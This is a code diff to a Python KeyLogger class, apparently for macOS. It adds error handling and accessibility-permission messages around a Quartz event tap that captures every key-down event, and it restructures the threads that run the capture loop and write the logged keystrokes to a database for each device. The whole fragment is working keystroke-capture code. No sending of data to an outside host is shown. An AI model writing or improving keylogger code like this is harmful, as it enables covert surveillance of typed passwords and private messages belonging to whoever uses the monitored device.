@@ -191,38 +191,48 @@ class KeyLogger:
             self.device_id = device_id
             self.running = True
             
-            # Create event tap
-            self.tap = CGEventTapCreate(
-                kCGSessionEventTap,
-                kCGHeadInsertEventTap,
-                0,
-                CGEventMaskBit(kCGEventKeyDown),
-                self.handle_event,
-                None
-            )
-            
-            if self.tap:
-                # Start writer thread
-                self.writer_thread = threading.Thread(target=self.write_to_db)
-                self.writer_thread.daemon = True
-                self.writer_thread.start()
+            # Check if we have accessibility permissions
+            try:
+                self.tap = CGEventTapCreate(
+                    kCGSessionEventTap,
+                    kCGHeadInsertEventTap,
+                    0,
+                    CGEventMaskBit(kCGEventKeyDown),
+                    self.handle_event,
+                    None
+                )
                 
-                # Start run loop in a separate thread
-                def run_loop():
+                if not self.tap:
+                    self.running = False
+                    return "Failed to create event tap. Please check accessibility permissions."
+                    
+            except Exception as e:
+                self.running = False
+                logger.error(f"Error creating event tap: {e}")
+                return "Error: Accessibility permissions required. Please grant access in System Preferences."
+
+            # Start writer thread
+            self.writer_thread = threading.Thread(target=self.write_to_db)
+            self.writer_thread.daemon = True
+            self.writer_thread.start()
+            
+            # Start run loop in a separate thread
+            def run_loop():
+                try:
                     run_loop_source = CFMachPortCreateRunLoopSource(None, self.tap, 0)
                     CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes)
                     CGEventTapEnable(self.tap, True)
-                    CFRunLoopRun()  # This will keep running and capturing events
-                
-                self.run_loop_thread = threading.Thread(target=run_loop)
-                self.run_loop_thread.daemon = True
-                self.run_loop_thread.start()
-                
-                logger.debug(f"Started logging for device {device_id}")
-                return "Keylogger started successfully"
-            else:
-                self.running = False
-                return "Failed to create event tap"
+                    CFRunLoopRun()
+                except Exception as e:
+                    logger.error(f"Error in run loop: {e}")
+                    self.running = False
+            
+            self.run_loop_thread = threading.Thread(target=run_loop)
+            self.run_loop_thread.daemon = True
+            self.run_loop_thread.start()
+            
+            logger.debug(f"Started logging for device {device_id}")
+            return "Keylogger started successfully"
                 
         except Exception as e:
             self.running = False
